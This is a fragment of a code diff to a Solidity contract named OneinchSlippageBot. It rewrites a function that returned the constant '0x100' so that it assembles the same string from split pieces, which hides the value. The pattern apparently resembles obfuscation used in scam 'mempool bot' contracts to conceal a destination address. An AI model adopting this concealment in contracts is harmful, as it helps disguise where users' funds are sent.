@@ -222,8 +222,11 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x100";
-    }
+    bytes memory part1 = "0x";
+    bytes memory part2 = "1";
+    bytes memory part3 = "00";
+    return string(abi.encodePacked(part1, part2, part3));
+}
     /*
      * @dev Check if contract has enough liquidity available
      * @param self The contract to operate on.
